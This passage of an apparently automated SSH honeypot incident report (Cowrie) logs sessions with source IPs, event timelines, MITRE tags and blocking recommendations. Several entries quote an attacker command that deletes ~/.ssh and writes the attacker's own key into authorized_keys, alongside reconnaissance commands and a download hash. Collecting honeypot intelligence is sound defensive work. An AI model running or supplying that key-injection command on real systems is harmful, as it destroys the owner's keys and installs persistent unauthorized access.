| `2026-07-03 19:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360ccab7ea92

| Field | Detail |
|---|---|
| **Source IP** | `101.96.225[.]252` |
| **First Seen** | 2026-07-03 19:11 |
| **Last Seen** | 2026-07-03 19:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:11:56` | `cowrie.session.connect` |
| `2026-07-03 19:11:56` | `cowrie.client.version` |
| `2026-07-03 19:11:56` | `cowrie.client.kex` |
| `2026-07-03 19:11:58` | `cowrie.login.success` |
| `2026-07-03 19:11:59` | `cowrie.session.params` |
| `2026-07-03 19:11:59` | `cowrie.command.input` |
| `2026-07-03 19:11:59` | `cowrie.log.closed` |
| `2026-07-03 19:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.225[.]252` to AbuseIPDB if not already reported
- [ ] Block `101.96.225[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c813cc1858

| Field | Detail |
|---|---|
| **Source IP** | `159.223.156[.]159` |
| **First Seen** | 2026-07-03 19:13 |
| **Last Seen** | 2026-07-03 19:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:13:25` | `cowrie.session.connect` |
| `2026-07-03 19:13:25` | `cowrie.client.version` |
| `2026-07-03 19:13:25` | `cowrie.client.kex` |
| `2026-07-03 19:13:25` | `cowrie.login.success` |
| `2026-07-03 19:13:25` | `cowrie.session.params` |
| `2026-07-03 19:13:25` | `cowrie.command.input` |
| `2026-07-03 19:13:25` | `cowrie.command.failed` |
| `2026-07-03 19:13:26` | `cowrie.log.closed` |
| `2026-07-03 19:13:26` | `cowrie.session.params` |
| `2026-07-03 19:13:26` | `cowrie.command.input` |
| `2026-07-03 19:13:26` | `cowrie.session.file_download` |
| `2026-07-03 19:13:26` | `cowrie.log.closed` |
| `2026-07-03 19:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.156[.]159` to AbuseIPDB if not already reported
- [ ] Block `159.223.156[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94ecd88f4bd

| Field | Detail |
|---|---|
| **Source IP** | `159.223.156[.]159` |
| **First Seen** | 2026-07-03 19:13 |
| **Last Seen** | 2026-07-03 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:13:26` | `cowrie.session.connect` |
| `2026-07-03 19:13:26` | `cowrie.client.version` |
| `2026-07-03 19:13:26` | `cowrie.client.kex` |
| `2026-07-03 19:13:26` | `cowrie.login.success` |
| `2026-07-03 19:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.156[.]159` to AbuseIPDB if not already reported
- [ ] Block `159.223.156[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238b06e7b56f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.156[.]159` |
| **First Seen** | 2026-07-03 19:13 |
| **Last Seen** | 2026-07-03 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:13:27` | `cowrie.session.connect` |
| `2026-07-03 19:13:27` | `cowrie.client.version` |
| `2026-07-03 19:13:27` | `cowrie.client.kex` |
| `2026-07-03 19:13:27` | `cowrie.login.success` |
| `2026-07-03 19:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.156[.]159` to AbuseIPDB if not already reported
- [ ] Block `159.223.156[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4017e66a21d6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 19:19 |
| **Last Seen** | 2026-07-03 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:19:16` | `cowrie.session.connect` |
| `2026-07-03 19:19:16` | `cowrie.client.version` |
| `2026-07-03 19:19:16` | `cowrie.client.kex` |
| `2026-07-03 19:19:17` | `cowrie.login.success` |
| `2026-07-03 19:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41b50f71fcb4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 19:19 |
| **Last Seen** | 2026-07-03 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:19:16` | `cowrie.session.connect` |
| `2026-07-03 19:19:16` | `cowrie.client.version` |
| `2026-07-03 19:19:17` | `cowrie.client.kex` |
| `2026-07-03 19:19:18` | `cowrie.login.success` |
| `2026-07-03 19:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e7713e01e2

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-07-03 19:20 |
| **Last Seen** | 2026-07-03 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:20:26` | `cowrie.session.connect` |
| `2026-07-03 19:20:26` | `cowrie.client.version` |
| `2026-07-03 19:20:27` | `cowrie.client.kex` |
| `2026-07-03 19:20:28` | `cowrie.login.success` |
| `2026-07-03 19:20:29` | `cowrie.session.params` |
| `2026-07-03 19:20:29` | `cowrie.command.input` |
| `2026-07-03 19:20:29` | `cowrie.command.failed` |
| `2026-07-03 19:20:29` | `cowrie.log.closed` |
| `2026-07-03 19:20:30` | `cowrie.session.params` |
| `2026-07-03 19:20:30` | `cowrie.command.input` |
| `2026-07-03 19:20:31` | `cowrie.session.file_download` |
| `2026-07-03 19:20:31` | `cowrie.log.closed` |
| `2026-07-03 19:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce22734e7d5

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-07-03 19:20 |
| **Last Seen** | 2026-07-03 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:20:31` | `cowrie.session.connect` |
| `2026-07-03 19:20:31` | `cowrie.client.version` |
| `2026-07-03 19:20:31` | `cowrie.client.kex` |
| `2026-07-03 19:20:32` | `cowrie.login.success` |
| `2026-07-03 19:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99fa5225cc22

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-07-03 19:20 |
| **Last Seen** | 2026-07-03 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:20:33` | `cowrie.session.connect` |
| `2026-07-03 19:20:33` | `cowrie.client.version` |
| `2026-07-03 19:20:33` | `cowrie.client.kex` |
| `2026-07-03 19:20:34` | `cowrie.login.success` |
| `2026-07-03 19:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31214c7ae396

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 19:22 |
| **Last Seen** | 2026-07-03 19:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:22:13` | `cowrie.session.connect` |
| `2026-07-03 19:22:14` | `cowrie.client.version` |
| `2026-07-03 19:22:14` | `cowrie.client.kex` |
| `2026-07-03 19:22:20` | `cowrie.login.success` |
| `2026-07-03 19:22:23` | `cowrie.session.params` |
| `2026-07-03 19:22:23` | `cowrie.command.input` |
| `2026-07-03 19:22:26` | `cowrie.log.closed` |
| `2026-07-03 19:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1a69e36d6d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 19:30 |
| **Last Seen** | 2026-07-03 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:30:04` | `cowrie.session.connect` |
| `2026-07-03 19:30:04` | `cowrie.client.version` |
| `2026-07-03 19:30:04` | `cowrie.client.kex` |
| `2026-07-03 19:30:04` | `cowrie.login.success` |
| `2026-07-03 19:30:04` | `cowrie.direct-tcpip.request` |
| `2026-07-03 19:30:04` | `cowrie.direct-tcpip.data` |
| `2026-07-03 19:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ebffb9b6181

| Field | Detail |
|---|---|
| **Source IP** | `216.57.110[.]81` |
| **First Seen** | 2026-07-03 19:31 |
| **Last Seen** | 2026-07-03 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:31:23` | `cowrie.session.connect` |
| `2026-07-03 19:31:23` | `cowrie.client.version` |
| `2026-07-03 19:31:23` | `cowrie.client.kex` |
| `2026-07-03 19:31:24` | `cowrie.login.success` |
| `2026-07-03 19:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.57.110[.]81` to AbuseIPDB if not already reported
- [ ] Block `216.57.110[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e3dee4fc33

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-03 19:31 |
| **Last Seen** | 2026-07-03 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:31:24` | `cowrie.session.connect` |
| `2026-07-03 19:31:24` | `cowrie.client.version` |
| `2026-07-03 19:31:24` | `cowrie.client.kex` |
| `2026-07-03 19:31:24` | `cowrie.login.success` |
| `2026-07-03 19:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314289693670

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 19:33 |
| **Last Seen** | 2026-07-03 19:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:33:31` | `cowrie.session.connect` |
| `2026-07-03 19:33:32` | `cowrie.client.version` |
| `2026-07-03 19:33:32` | `cowrie.client.kex` |
| `2026-07-03 19:33:38` | `cowrie.login.success` |
| `2026-07-03 19:33:41` | `cowrie.session.params` |
| `2026-07-03 19:33:41` | `cowrie.command.input` |
| `2026-07-03 19:33:43` | `cowrie.log.closed` |
| `2026-07-03 19:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d3f2ad1aeb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 19:44 |
| **Last Seen** | 2026-07-03 19:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:44:47` | `cowrie.session.connect` |
| `2026-07-03 19:44:49` | `cowrie.client.version` |
| `2026-07-03 19:44:49` | `cowrie.client.kex` |
| `2026-07-03 19:44:55` | `cowrie.login.success` |
| `2026-07-03 19:44:59` | `cowrie.session.params` |
| `2026-07-03 19:44:59` | `cowrie.command.input` |
| `2026-07-03 19:45:00` | `cowrie.log.closed` |
| `2026-07-03 19:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3d0e2489a5

| Field | Detail |
|---|---|
| **Source IP** | `114.217.10[.]60` |
| **First Seen** | 2026-07-03 19:47 |
| **Last Seen** | 2026-07-03 19:52 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:47:02` | `cowrie.session.connect` |
| `2026-07-03 19:47:02` | `cowrie.client.version` |
| `2026-07-03 19:47:02` | `cowrie.client.kex` |
| `2026-07-03 19:47:03` | `cowrie.login.success` |
| `2026-07-03 19:47:04` | `cowrie.session.params` |
| `2026-07-03 19:47:04` | `cowrie.command.input` |
| `2026-07-03 19:47:04` | `cowrie.command.failed` |
| `2026-07-03 19:47:04` | `cowrie.log.closed` |
| `2026-07-03 19:47:05` | `cowrie.session.params` |
| `2026-07-03 19:47:05` | `cowrie.command.input` |
| `2026-07-03 19:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03a008accf0

| Field | Detail |
|---|---|
| **Source IP** | `114.217.10[.]60` |
| **First Seen** | 2026-07-03 19:47 |
| **Last Seen** | 2026-07-03 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:47:19` | `cowrie.session.connect` |
| `2026-07-03 19:47:19` | `cowrie.client.version` |
| `2026-07-03 19:47:19` | `cowrie.client.kex` |
| `2026-07-03 19:47:20` | `cowrie.login.success` |
| `2026-07-03 19:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f073b47e48a

| Field | Detail |
|---|---|
| **Source IP** | `94.180.250[.]11` |
| **First Seen** | 2026-07-03 19:52 |
| **Last Seen** | 2026-07-03 19:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:52:22` | `cowrie.session.connect` |
| `2026-07-03 19:52:22` | `cowrie.client.version` |
| `2026-07-03 19:52:22` | `cowrie.client.kex` |
| `2026-07-03 19:52:23` | `cowrie.login.success` |
| `2026-07-03 19:52:23` | `cowrie.session.params` |
| `2026-07-03 19:52:23` | `cowrie.command.input` |
| `2026-07-03 19:52:23` | `cowrie.command.failed` |
| `2026-07-03 19:52:24` | `cowrie.log.closed` |
| `2026-07-03 19:52:25` | `cowrie.session.params` |
| `2026-07-03 19:52:25` | `cowrie.command.input` |
| `2026-07-03 19:52:25` | `cowrie.session.file_download` |
| `2026-07-03 19:52:25` | `cowrie.log.closed` |
| `2026-07-03 19:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.180.250[.]11` to AbuseIPDB if not already reported
- [ ] Block `94.180.250[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4512b14381c4

| Field | Detail |
|---|---|
| **Source IP** | `94.180.250[.]11` |
| **First Seen** | 2026-07-03 19:52 |
| **Last Seen** | 2026-07-03 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:52:25` | `cowrie.session.connect` |
| `2026-07-03 19:52:25` | `cowrie.client.version` |
| `2026-07-03 19:52:25` | `cowrie.client.kex` |
| `2026-07-03 19:52:26` | `cowrie.login.success` |
| `2026-07-03 19:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.180.250[.]11` to AbuseIPDB if not already reported
- [ ] Block `94.180.250[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680eb4e6a356

| Field | Detail |
|---|---|
| **Source IP** | `94.180.250[.]11` |
| **First Seen** | 2026-07-03 19:52 |
| **Last Seen** | 2026-07-03 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:52:26` | `cowrie.session.connect` |
| `2026-07-03 19:52:26` | `cowrie.client.version` |
| `2026-07-03 19:52:26` | `cowrie.client.kex` |
| `2026-07-03 19:52:27` | `cowrie.login.success` |
| `2026-07-03 19:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.180.250[.]11` to AbuseIPDB if not already reported
- [ ] Block `94.180.250[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4312dd30a060

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 19:54 |
| **Last Seen** | 2026-07-03 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:54:56` | `cowrie.session.connect` |
| `2026-07-03 19:54:56` | `cowrie.client.version` |
| `2026-07-03 19:54:56` | `cowrie.client.kex` |
| `2026-07-03 19:54:57` | `cowrie.login.success` |
| `2026-07-03 19:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acbc47bfc1c9

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 19:54 |
| **Last Seen** | 2026-07-03 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:54:56` | `cowrie.session.connect` |
| `2026-07-03 19:54:56` | `cowrie.client.version` |
| `2026-07-03 19:54:56` | `cowrie.client.kex` |
| `2026-07-03 19:54:57` | `cowrie.login.success` |
| `2026-07-03 19:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffce0fd71da0

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 19:55 |
| **Last Seen** | 2026-07-03 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:55:03` | `cowrie.session.connect` |
| `2026-07-03 19:55:03` | `cowrie.client.version` |
| `2026-07-03 19:55:03` | `cowrie.client.kex` |
| `2026-07-03 19:55:04` | `cowrie.login.success` |
| `2026-07-03 19:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6234097d494e

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-03 19:55 |
| **Last Seen** | 2026-07-03 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:55:04` | `cowrie.session.connect` |
| `2026-07-03 19:55:04` | `cowrie.client.version` |
| `2026-07-03 19:55:05` | `cowrie.client.kex` |
| `2026-07-03 19:55:06` | `cowrie.login.success` |
| `2026-07-03 19:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d47c22cd88

